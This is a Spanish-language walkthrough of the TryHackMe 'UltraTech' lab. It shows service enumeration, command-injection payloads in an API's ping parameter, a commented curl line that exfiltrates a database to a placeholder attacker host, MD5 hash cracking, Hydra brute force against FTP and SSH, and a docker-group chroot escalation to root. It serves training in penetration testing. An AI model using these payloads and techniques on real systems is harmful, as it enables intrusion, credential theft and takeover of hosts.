# 🧪 UltraTech — Writeup (TryHackMe)

> **📝 Resumen / Introducción**  
> *UltraTech* es una máquina de TryHackMe orientada a los fundamentos del pentesting: **enumeración**, testing de aplicaciones web y **escalada de privilegios**.  
> En este writeup realizamos una enumeración sobre una API vulnerable donde explotamos **Command Injection**, extraemos hashes de la base de datos para acceder a un usuario y, finalmente, escalamos privilegios aprovechando una configuración con **Docker**.

---

# 🔹 Paso 1 — Ping

🎯 **Objetivo:**  
Comprobar la conectividad con la máquina objetivo y verificar los tiempos de respuesta (latencia) antes de iniciar la enumeración.

🖥️ **Comando utilizado:**
```bash
ping -c 4 10.10.247.158
````
🧾 Descripción del resultado:

Se enviaron 4 paquetes ICMP y se recibieron 4 respuestas: 4 packets transmitted, 4 received, 0% packet loss — esto confirma que la máquina objetivo responde por ICMP.

Los tiempos de ida y vuelta aparecen como min/avg/max/mdev y nos muestran la latencia entre nuestra máquina y la objetivo. En este caso la latencia media es ~43 ms (rtt min/avg/max/mdev = 42.249/43.734/46.892/1.843 ms).

ttl = 63 — dato complementario que suele indicar un sistema Unix-like (información auxiliar).

🔍 Interpretación:
La máquina 10.10.247.158 está activa y accesible desde la red. No hay pérdida de paquetes, por lo que podemos proceder con escaneos más exhaustivos (por ejemplo nmap) y continuar la enumeración sin preocuparnos por problemas de conectividad intermitente.

📸 Evidencia:

<img width="659" height="208" alt="Ping" src="https://github.com/user-attachments/assets/a48858e5-a78b-4bb5-99a0-df4cd54d7170" />

---

# 🔹 Paso 2 — Nmap (Descubrimiento de servicios)

🎯 **Objetivo:**  
Identificar puertos abiertos y servicios en ejecución para localizar posibles vectores de ataque (web, API, FTP, SSH, etc.).

🖥️ **Comando utilizado:**  
*(se ejecutó con scripts básicos y detección de versiones)*
```bash
nmap -sC -sV -p- 10.10.247.158
````
🔍 Análisis / Observaciones:

FTP (21/tcp) — vsftpd 3.0.5: comprobar si permite acceso anónimo o listar archivos públicos (anonymous), puede contener archivos reveladores (backups, credenciales, uploads).

SSH (22/tcp) — OpenSSH 8.2p1: servicio típico; útil para acceso interactivo si conseguimos credenciales (registros, hashes, contraseñas reutilizadas). Las huellas de host (ssh-hostkey) se han guardado como evidencia.

HTTP (8081/tcp) — Node.js / Express: probablemente la API o una aplicación web basada en Node (tal vez la API vulnerable mencionada en el objetivo). Importante revisar endpoints, cabeceras CORS, métodos permitidos (HEAD/GET/POST/PUT/DELETE/PATCH) — posible vector para Command Injection si la API recibe parámetros sin sanitizar.

HTTP (31331/tcp) — Apache/2.4.41: página pública con título "UltraTech - The best of technology (AI, FinTech, Big Data)" — revisar contenido, endpoints, formularios, archivos estáticos, y posibles rutas administrativas.

Sistemas: Nmap infiere SO tipo Unix/Linux (coherente con los servicios detectados).

📌 Prioridad: Priorizar enumeración web/API en 8081 y 31331 (exposición de funcionalidades y endpoints). Paralelamente, comprobar FTP anónimo y recopilar evidencias que permitan posteriores intentos de acceso SSH.

📸 Evidencia:

<img width="949" height="451" alt="Nmap" src="https://github.com/user-attachments/assets/9201d9f2-407a-497b-b3cd-2128623b9ed9" />

---

# 🔹 Paso 3 — Dirb en 10.10.247.158:8081

🎯 **Objetivo:**  
Descubrir rutas y endpoints ocultos en la aplicación Node/Express que corre en el puerto **8081**, para localizar puntos de entrada (posibles formularios o endpoints API) que podamos probar más a fondo.

🖥️ **Comando utilizado:**
```bash
dirb http://10.10.247.158:8081 /usr/share/dirb/wordlists/common.txt
````
🔍 Análisis / Observaciones:

/auth (200) — Endpoint accesible que probablemente sirva una página o API de autenticación (login). Debe revisarse en el navegador y con curl para ver si es un formulario HTML o un endpoint JSON.

/ping (500) — Respuesta 500 Internal Server Error al acceder sugiere que el endpoint está lanzando una excepción en el servidor. Esto puede ser indicativo de que el endpoint procesa entrada del usuario (por ejemplo, un parámetro host o ip) y no la está sanitizando correctamente — un escenario típico donde Command Injection o errores en el manejo de parámetros pueden aparecer. 

Esto lo convierte en un candidato prioritario para pruebas de inyección y fuzzing.

📸 Evidencia:

<img width="748" height="447" alt="dirb al p8081" src="https://github.com/user-attachments/assets/f1e98504-b4c7-44ed-b41d-f2ec80bb8f27" />

---

# 🔹 Paso 4 — Gobuster en 10.10.247.158:31331

🎯 **Objetivo:**  
Enumerar directorios y archivos en la web pública (Apache) escuchando en el puerto **31331**, para localizar recursos (páginas, ficheros JS/CSS, robots.txt, rutas ocultas) que ayuden en la posterior enumeración y explotación.

🖥️ **Comando utilizado:**
```bash
gobuster dir -u http://10.10.247.158:31331 -w /usr/share/wordlists/dirb/common.txt -e
````
🔍 Análisis / Observaciones:

/index.html (200) — Página principal accesible; revisar en navegador e inspeccionar el código fuente (puede contener enlaces a scripts, comentarios o referencias a endpoints).

/robots.txt (200, tamaño pequeño) — Revisar su contenido: frecuentemente contiene rutas que el administrador no quiere indexar (a veces reveladoras).

/css, /js, /images, /javascript (301) — Directorios estáticos redirigidos; navegar a ellos para listar recursos (hojas de estilo y scripts) — los archivos JS pueden contener rutas a APIs o endpoints interesantes.

/.htaccess, /.htpasswd, /.hta (403) — Bloqueados por permisos, pero su existencia indica configuración de Apache; si en algún momento se puede leer backups o versiones antiguas, podrían contener credenciales o reglas.

/server-status (403) — Módulo mod_status presente pero protegido; si fuese accesible mostraría información útil (requests, módulos, uptime). El 403 indica que está deshabilitado para acceso público, lo cual es normal, pero merece comprobar si hay rutas relacionadas mal configuradas.

El header detectado en Nmap (Apache/2.4.41) confirma servidor Apache — investigar posibles configuraciones por defecto o ficheros .conf expuestos en otras rutas.

📸 Evidencia:

<img width="891" height="409" alt="gobuster p31331" src="https://github.com/user-attachments/assets/a03497c3-8539-481c-bd4c-82e0bafb2adb" />

---

# 🔹 Paso 5 — Inspección web: Página en :8081 y `robots.txt` / `sitemap` en :31331

🎯 **Objetivo:**  
Verificar el contenido visible en los servicios web detectados anteriormente: la aplicación/API en **:8081** y la web pública en **:31331**. Extraer ficheros útiles como `robots.txt` y `sitemap` que nos orienten sobre rutas importantes.

---

## 🖥️ 8081 — Página principal de la API

**Qué hicimos:** Abrimos `http://10.10.247.158:8081/` en el navegador (o con `curl`) para observar la cabecera/landing de la API.

**Resultado visual / salida:**

**Interpretación:**  
- La ruta raíz en **:8081** muestra una página simple indicando que es una **API (v0.1.3)**.  
- Esto confirma que el servicio en 8081 es una API (probablemente basada en Node/Express, como indicó nmap). Debemos priorizar la enumeración de endpoints (por ejemplo `/auth`, `/ping` ya vistos) y probar parámetros que acepte la API.

**Evidencia:**  

<img width="802" height="140" alt="pagina p8081" src="https://github.com/user-attachments/assets/d0c45c2b-72e7-4252-9446-f8390625526d" />

---

## 🧭 31331 — `robots.txt` y `utech_sitemap.txt`

**Qué hicimos:** Accedimos a `http://10.10.247.158:31331/robots.txt` y seguimos la referencia al sitemap `utech_sitemap.txt`.

**`robots.txt` (contenido observado):**

Allow: *
User-Agent: *
Sitemap: utech_sitemap.txt

**`utech_sitemap.txt` (contenido observado):**

index.html
what.html
partners.html


**Interpretación / utilidad:**  
- `robots.txt` apunta a un sitemap simple (`utech_sitemap.txt`) que lista páginas públicas: **index.html**, **what.html**, **partners.html**.  
- Aunque parecen páginas estáticas, siempre conviene inspeccionar el `index.html` y el resto en busca de:
  - Comentarios en el HTML que revelen rutas API, endpoints, claves o notas del desarrollador.
  - Referencias a ficheros JavaScript que llamen a endpoints (ej. `/api/*`, `/auth`, `/ping`), tokens o rutas administrativas.
  - Formularios o endpoints que puedan mapearse con los hallazgos en el puerto 8081 (coordinación entre frontend en 31331 y API en 8081).
- Los sitemaps incluidos en `robots.txt` son una fuente fiable de rutas "interesantes" para priorizar en la enumeración.

**Evidencia:**  

<img width="780" height="432" alt="archivo robots y utech sitemap" src="https://github.com/user-attachments/assets/714efcac-2b81-4cd4-b6b1-cb446fb71e56" />

---

# 🔹 Paso 6 — Inspección del frontend: `partners.html` y `js/api.js`

🎯 **Objetivo:**  
Analizar el código fuente del frontend (páginas estáticas y scripts) para encontrar referencias a la API y confirmar los endpoints/ parámetros que debemos atacar (prioridad: `/ping` y `/auth`).

---

## 🧾 Qué hemos encontrado (resumen)

- En `partners.html` hay un **formulario de login** (campos `login` y `password`) cuyo `method` es **GET** y que **en runtime** se asigna para hacer POST/GET a la API (ver más abajo). Esto sugiere que el frontend envía credenciales al endpoint de autenticación de la API.  
  **Evidencia:**
  
  <img width="1589" height="854" alt="pagina p31331, partner html" src="https://github.com/user-attachments/assets/4ace8a9d-2666-48df-aec0-0b6c9bb3518f" />

  <img width="1201" height="796" alt="codigo fuente partners html pagina js api" src="https://github.com/user-attachments/assets/c0163bbc-dfbd-4162-97f3-acd5927335a2" />

  <img width="823" height="712" alt="arhicvo api js encontramos paramtro de la API" src="https://github.com/user-attachments/assets/bf7b4e50-0077-457c-848c-3c3eab7a3deb" />


- En el script `js/api.js` (referenciado desde `partners.html`) hay una función `getAPIURL()` que construye la URL base apuntando al mismo host del navegador pero en el puerto **8081**:
  ```js
  function getAPIURL() {
    return `${window.location.hostname}:8081`
  }
  ```` 

Además, la función checkAPIStatus() realiza una petición a:
````bash
http://${getAPIURL()}/ping?ip=${window.location.hostname}
````
Es decir, el endpoint /ping recibe el parámetro ip (no host) y se llama automáticamente desde el frontend usando window.location.hostname.
Evidencia: images/Paso6_api_js_ping.png

También se observa que más abajo el script asigna la acción del formulario:
````js
form.action = `http://${getAPIURL()}/auth`;
````
Por tanto el formulario de login envía los datos a http://<host>:8081/auth.
Evidencia (código fuente): images/Paso6_source_partners_html.png

🔍 Interpretación y riesgo

El frontend está acoplando la web pública (31331) con la API (8081) mediante llamadas directas en JavaScript. Esto facilita nuestra labor: cualquier endpoint usado por la web es un objetivo directo contra la API.

El endpoint /ping utiliza un parámetro ip suministrado por el cliente. Si la API ejecuta comandos del sistema (por ejemplo ping ${ip}) sin sanitizar la entrada, es un candidato claro para Command Injection.

El endpoint /auth recibe credenciales; hay que comprobar si existen fallos en autenticación, pero dado que el /ping ya devolvió 500 en pruebas previas, priorizaremos /ping para inyección.

---

# 🔹 Paso 7 — Explotación: Command Injection en `/ping` (confirmación y extracción inicial)

🎯 **Objetivo:**  
Confirmar la vulnerabilidad de **Command Injection** en el endpoint `/ping?ip=...`, obtener pruebas de ejecución remota de comandos y localizar ficheros sensibles (por ejemplo la base de datos `utech.db.sqlite`) para su posterior extracción.

---

## 🔬 Qué hicimos / Comandos ejecutados

> Observamos que al acceder a `/ping?ip=...` el servidor ejecuta un comando `ping` con el parámetro `ip` sin sanitizar. Aprovechamos esto para ejecutar comandos arbitrarios en el servidor.

### 1) Prueba básica (GET)
```bash
# Petición básica (sin payload)
curl -s "http://10.10.247.158:8081/ping?ip=127.0.0.1"
````
### 2) Inyección simple (obtener listado de ficheros)
````bash
# Inyectamos un terminador de comando y un listado (ls)
curl -s "http://10.10.247.158:8081/ping?ip=127.0.0.1;ls%20-la"

# Alternativa con && (dependiendo de shell)
curl -s "http://10.10.247.158:8081/ping?ip=127.0.0.1&&ls%20-la"
````
### 3) Comando para mostrar fichero detectado (ejemplo)
````bash
# Mostrar contenido textual (si es texto)
curl -s "http://10.10.247.158:8081/ping?ip=127.0.0.1;cat%20utech.db.sqlite"
````
### 4) Extraer fichero binario usando base64
````bash
# Codificar el fichero en base64 y que la salida sea parte de la respuesta
curl -s "http://10.10.247.158:8081/ping?ip=127.0.0.1;base64%20utech.db.sqlite"
````
### 5) Si el servidor tiene curl o wget, intentar volcar el archivo hacia nuestro servidor atacante (opción alternativa)
````bash
# Desde el target: (p.ej. si existe curl)
# curl -F "file=@utech.db.sqlite" http://<MI_IP>/upload
# o usar wget para subir a un servidor que acepte PUT/POST (si está disponible)
````
🧾 Evidencia (capturas)

Ejecución de ls vía injection — vemos en la respuesta del endpoint que se listan ficheros y entre ellos aparece utech.db.sqlite.

<img width="833" height="325" alt="utilizamos inyeccion de comandos ya que vemos que es vulnerabla a esto" src="https://github.com/user-attachments/assets/7ae562cb-9b21-480e-86a5-412999824603" />

Comprobación de tráfico ICMP saliente — al inyectar un ping hacia nuestra IP (o al observar el comportamiento) confirmamos con tcpdump en nuestro host que el servidor envía paquetes ICMP hacia nuestra IP (evidencia de ejecución remota):

<img width="1878" height="191" alt="utilizmao el parametro con nuestra ip y ejecuto tcpdump hace ping" src="https://github.com/user-attachments/assets/7b4941e7-3516-4cd8-8811-4f42f2bbe664" />

Estas dos evidencias confirman que el servidor está ejecutando comandos con el contenido del parámetro ip y que podemos ejecutar comandos arbitrarios.

🔍 Análisis / Observaciones

La existencia de utech.db.sqlite indica una base de datos SQLite local que muy probablemente contiene información sensible: usuarios, hashes, tokens, etc.

La forma más fiable y limpia de exfiltrar ese fichero binario es:

Codificarlo en base64 en el servidor y volcar la salida en la respuesta HTTP, o

Usar una transferencia directa desde el servidor hacia un servicio nuestro (si curl/wget/nc están disponibles).

Mostrar el fichero crudo en la respuesta puede corromperlo; por eso recomendamos base64.

---

# 🔹 Paso 8 — Exfiltración de `utech.db.sqlite` usando Command Injection con Burp Suite

🎯 **Objetivo:**  
Usar la vulnerabilidad de **Command Injection** confirmada en `/ping?ip=...` para ejecutar comandos en la máquina objetivo que nos permitan **exfiltrar** el fichero `utech.db.sqlite`. En este paso arrancamos un servidor HTTP desde la máquina objetivo y descargamos la base de datos a nuestro equipo atacante.

---

## 🔬 Resumen de la técnica
Hemos comprobado que el parámetro `ip` se concatena en un comando del sistema. Aprovechamos esto para ejecutar comandos arbitrarios. En lugar de intentar volcar el fichero binario directamente por la respuesta HTTP (lo cual puede corromperlo), arrancamos un servidor HTTP sencillo (usando Python) en la máquina objetivo y luego navegamos a él desde nuestra máquina para descargar `utech.db.sqlite` de forma íntegra.

---

## ✅ Comprobaciones previas (evidencia)

- Comprobamos la disponibilidad de `python`/`python3` en el target con un payload `which python` o `which python3` (se ve en Burp/Request).  
- Ejecutamos comandos simples (`id`) para confirmar ejecución remota. (Evidencia: captura mostrando respuesta `ping: groups=1002(www): Name or service not known` al inyectar `id` — demuestra ejecución parcial y salida del sistema).  
- Confirmamos que la ejecución permite lanzar procesos persistentes (arrancar un servidor). (Evidencia: screenshots `which python`, `id`, y `Directory listing for /` en `http://<TARGET>:8090/` mostrando `utech.db.sqlite`).

---

## 🛠️ Comandos / Payloads utilizados (con formato para inyectar en la URL)

> **Nota:** en las peticiones HTTP tienes que URL-encodear espacios y caracteres especiales (ej. ` ` → `%20`, `;` → `%3B` o usar backticks según el shell). A continuación mostramos ejemplos ya preparados.

1. **Comprobar `which` de Python**  
   (para saber qué intérprete existe en el sistema)
```http
GET /ping?ip=which+python3 HTTP/1.1
Host: 10.10.247.158:8081
````
Resultado esperado: ruta a python3 en el servidor (si existe).

2. Probar ejecución sencilla (id)
````http
GET /ping?ip=%60id%60 HTTP/1.1
Host: 10.10.247.158:8081
````
(o) usando comillas/backticks:
````bash
/ping?ip=`id`
````
Respuesta: salida del comando id (evidencia de ejecución).

3. Arrancar un servidor HTTP con Python en el target (puerto 8090)

Payload (GET) (URL-encoded):
````bash
/ping?ip=python3+-m+http.server+8090
````
Equivalente con backticks o ; si tu shell necesita:
````bash
/ping?ip=127.0.0.1;python3 -m http.server 8090
````
Resultado: el servidor en el target sirve el directorio actual, y accediendo a http://<TARGET>:8090/ desde tu máquina verás el listado de ficheros (incluido utech.db.sqlite). (Evidencia: captura Directory listing for / mostrando utech.db.sqlite.)

🧾 Evidencia (capturas referenciadas)

<img width="587" height="639" alt="comprobamos python" src="https://github.com/user-attachments/assets/7b7183ad-d076-4756-830c-de38065e63de" />

<img width="867" height="710" alt="configuro servidor y obtengo directorios" src="https://github.com/user-attachments/assets/9f358cd7-98c1-4c1e-9a74-6d7a8b2d1793" />

<img width="580" height="676" alt="funciona payload" src="https://github.com/user-attachments/assets/95ad12df-7854-4937-bc51-fd9b704eb0e8" />

<img width="582" height="745" alt="con burp suit comprubo command injection" src="https://github.com/user-attachments/assets/c7c92bf1-2206-4c74-b70b-d3f99b2e9798" />

---

# 🔹 Paso 9 — Inspección local: descarga de ficheros y análisis de la base de datos (`utech.db.sqlite`)

🎯 **Objetivo:**  
Analizar los ficheros que hemos conseguido exfiltrar y la base de datos SQLite para extraer credenciales o información sensible que nos permita avanzar (autenticación, movimientos laterales, escalada).

---

## 🛠️ Qué hicimos (comandos y pasos)

1. **Descargamos el fichero `utech.db.sqlite`** desde el servidor objetivo (ya documentado en el Paso 8).

2. **Abrimos la base de datos con DB Browser / sqlite3** para listar tablas y revisar su contenido:
```bash
# listar tablas con sqlite3
sqlite3 utech.db.sqlite ".tables"

# ver esquema de la tabla users (ejemplo)
sqlite3 utech.db.sqlite "PRAGMA table_info('users');"

# mostrar registros (ejemplo)
sqlite3 utech.db.sqlite "SELECT login, password, type FROM users;"
````
3. Observamos la tabla users con (al menos) dos entradas relevantes: admin y r00t (columna password con hashes).

Los hashes parecen ser MD5 (se verificó con un servicio de cracking online / herramienta local).

Resultado del cracking (ejemplo): ambos hashes devolvieron contraseñas en texto plano (documenta las contraseñas en tu entorno privado; en el writeup público puedes indicar que las has crackeado y qué usuario queda funcional sin publicar contraseñas si prefieres).

4. Inspeccionamos los ficheros del directorio que exfiltramos (index.js, package.json, start.sh, etc.):
````bash
# listar ficheros
ls -la

# ver contenido del script arranque
cat start.sh
````
start.sh contiene:
````bash
#!/usr/bin/env bash

if ps -a | grep 'node'; then
  echo 'API is running';
else
  cd /home/www/api/ && node index.js;
fi
````
Esto nos indica la ruta de la aplicación: /home/www/api/ y que el servicio se inicia con node index.js. Es información útil para la fase de post-explotación (ficheros de configuración, .env, credenciales, rutas).

🧾 Evidencia (capturas)

<img width="509" height="444" alt="abro la bbdd y tengo dos hashes" src="https://github.com/user-attachments/assets/6f881f7c-549d-4a0c-8a4a-6a23d7f2add1" />

<img width="883" height="444" alt="obtengo contraseñas" src="https://github.com/user-attachments/assets/36f8981c-3161-434d-8660-726649fc699c" />

<img width="857" height="286" alt="me descargo los fihceros el shell nada interesante" src="https://github.com/user-attachments/assets/3c738219-92b6-4443-be12-63fa87e36222" />

🔍 Análisis / Observaciones

La base de datos incluye credenciales hashed para usuarios críticos (admin, r00t). Al estar en MD5 y sin salt, son susceptibles de crackeo con diccionarios rápidos (John / Hashcat / servicios online).

---

# 🔹 Paso 10 — Fuerza bruta con Hydra (FTP & SSH)

🎯 **Objetivo:**  
Probar las credenciales obtenidas/crackeadas contra servicios accesibles (FTP y SSH) para conseguir acceso interactivo o listado de ficheros. En este paso usamos listas de `users` y `passwords` (generadas a partir de la base de datos y wordlists) con **Hydra**.

---

## 🖥️ Comandos ejecutados

> Nota: en tus capturas se muestra que Hydra devolvió un par válido tanto para FTP como para SSH contra `10.10.26.250`. En el writeup público **sugiero ofuscar/ocultar** las contraseñas reales para no exponer credenciales en un repo público.

### 1) Ataque contra FTP
```bash
# archivos locales: users  passwords
hydra -f -V -L users -P passwords ftp://10.10.26.250
````
-f stop al encontrar la primera credencial válida

-V verbose (muestra intentos)

Salida (resumen):
````pgsql
[STATUS] attack finished for 10.10.26.250 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
````

<img width="852" height="581" alt="ejecuto hydra con los arhcivos creados de pass y users FTP" src="https://github.com/user-attachments/assets/295bc7fd-d729-4b2d-97ec-ade79513cc5e" />

### 2) Ataque contra SSH
````bash
hydra -f -V -L users -P passwords ssh://10.10.26.250
````
Salida resumen:
```pgsql
[22][ssh] host: 10.10.26.250  login: <usuario_encontrado>   password: <password_encontrado>
[STATUS] attack finished for 10.10.26.250 (valid pair found)
```

<img width="850" height="562" alt="ejecuto hydra con los arhcivos creados de pass y users SSH" src="https://github.com/user-attachments/assets/a26df24f-2235-4cfa-af86-ab9ac5a3106a" />

🔍 Interpretación

Hydra ha encontrado credenciales válidas para al menos uno de los usuarios listados en users (p.ej. admin, r00t, u otro) tanto en FTP como en SSH.

Esto confirma que los hashes en la base de datos (utech.db.sqlite) correspondían a contraseñas usadas por los servicios del sistema (no solo para la app).

---

# 🔹 Paso 11 — Acceso inicial y descubrimiento: usuario `r00t` y grupo `docker`

🎯 **Objetivo:**  
Documentar el acceso obtenido al host, las pruebas realizadas y el hallazgo clave: el usuario con el que estamos (`r00t`) pertenece al **grupo `docker`**, lo que abre una ruta clara para escalar privilegios a **root** del host mediante el socket de Docker.

---

## 🖥️ Qué hicimos / comandos relevantes

### 1) Usuario actual
```bash
whoami
# salida esperada:
# r00t
````

### 2) Información de identidades y grupos
````bash
id
# salida relevante (ejemplo):
# uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
````
Observación: el usuario r00t está en el grupo docker. Esto es importante porque los usuarios del grupo docker suelen poder controlar el daemon de Docker a través de /var/run/docker.sock, 

y ese control a menudo se traduce en la capacidad de ejecutar contenedores con privilegios que permiten obtener root en el host.

### 3) Comprobar contenedores / historia de Docker
````bash
docker ps -a
# muestra contenedores (exited/created/running)
````

### 4) Intentos sobre contenedores existentes (logs)
````bash
docker logs <container_name_or_id>
# En algunos entornos 'docker logs' requiere ciertas utilidades; si no está disponible, listar /var/lib/docker/containers/... puede ayudar.
````

### 5) Inspección del sistema de ficheros montado (ejemplo)
````bash
ls /hostOS
ls -la /hostOS/root
# (evidencia en captura: /hostOS aparece y se listan directorios)
````

🧾 Evidencias (capturas)

<img width="654" height="118" alt="obtengo acceso con r00t y veo que tiene frupo docker" src="https://github.com/user-attachments/assets/2ff17b63-6899-4dcb-bc30-14152023efd4" />

<img width="858" height="238" alt="contenedores del docjer" src="https://github.com/user-attachments/assets/2ec02c24-6854-42bb-bab5-12fc5e508906" />

<img width="862" height="449" alt="miro los logs dentro del docker" src="https://github.com/user-attachments/assets/d1306452-6061-4d3b-9dcf-6543617e8e70" />

🔍 Análisis / Importancia del hallazgo

Pertenecer al grupo docker equivale, en la práctica, a tener la capacidad de ejecutar comandos como si se controlara el dominio Docker.

El socket de Docker (/var/run/docker.sock) permite a un usuario crear contenedores con volúmenes montados en el host, ejecutar imágenes privilegiadas, o usar docker cp/docker exec para moverse por el sistema — todo lo cual puede derivar en acceso root al host si se hace correctamente.

Dado que r00t está en docker, podemos usar varias técnicas para escalar a root del host.

---

# 🔹 Paso 12 — Escalada a root via Docker (montando `/` y chroot)

🎯 **Objetivo:**  
Aprovechar el acceso al socket/permisos de Docker (usuario en grupo `docker`) para obtener una shell como **root** en el host y recolectar evidencias finales (ficheros en `/root`, clave SSH privada, flag, etc.).

---

## 🧾 Resumen rápido
- Encontramos en `/root` un fichero `private.txt` (texto) y la llave privada SSH (`/root/.ssh/id_rsa`).  
- No hace falta explotar vulnerabilidades adicionales: aprovechamos Docker para montar el rootfs del host dentro de un contenedor y hacer `chroot` — de ese modo tuvimos una shell con uid 0 en el sistema real.

---

## ✅ Comandos y pasos ejecutados (reproducibles)

> **Nota:** ejecutar solo en un laboratorio/CTF autorizado.

1. **Ver información del host (desde la shell obtenida):**
```bash
uname -a
ls -l /root
cat /root/private.txt
````
Salida (ejemplo): private.txt estaba en /root y se pudo leer su contenido (texto descriptivo).

2. **Comprobar existencia de la llave privada SSH:**
````bash
ls -la /root/.ssh
# cat /root/.ssh/id_rsa   # NO imprimir la clave completa en un writeup público
````
Observación: la llave privada id_rsa estaba presente en /root/.ssh/.

3. **Extraer una evidencia parcial de la llave sin exponerla completa**
Por ejemplo, se muestran los primeros caracteres para documentar la presencia :
````bash
sed -n 2p id_rsa | cut -c 1-9
# -> (esto imprime sólo los primeros 9 caracteres de la segunda línea de la llave)
````
Esto se usa como “prueba” de que la llave existe sin publicar la clave completa en el writeup.

4. **Escalada a root real usando Docker (montar / y chroot):**
````bash
# Ejecutado desde el usuario con permisos docker (r00t en tu caso)
docker run -v /:/mnt --rm -it bash chroot /mnt sh
# Dentro del contenedor/chroot:
id    # debería devolver uid=0(root)
whoami
````

Salida esperada:
````bash
uid=0(root) gid=0(root) groups=...
whoami -> root
````

<img width="867" height="174" alt="con comandos de docker somos root" src="https://github.com/user-attachments/assets/94fd0cff-45dd-49f5-a531-9d28d881fdff" />

🧾 Evidencias recolectadas

<img width="861" height="445" alt="entramos al directorio de root pero la clave privada no esta ahi" src="https://github.com/user-attachments/assets/a92df6d5-7481-44ad-a21d-73032bb2abe5" />

<img width="721" height="624" alt="obtengo el rsa" src="https://github.com/user-attachments/assets/e6b5b71f-d087-471a-8246-543c63319712" />

<img width="618" height="217" alt="utilizando script obtengo los 9 primeros caracteres  del rsa" src="https://github.com/user-attachments/assets/e5ea6241-09d2-4782-a0b8-e4bc677bc4da" />

🔎 Conclusión de este paso

Usando la pertenencia al grupo docker y el acceso a Docker, pasamos de un usuario limitado (r00t con permisos docker) a un shell con uid 0 root del host real.

Encontramos archivos sensibles en /root (texto y llave privada). Con esto ya tenemos control total del sistema y la información necesaria para finalizar el CTF (flags, evidencia, limpieza).




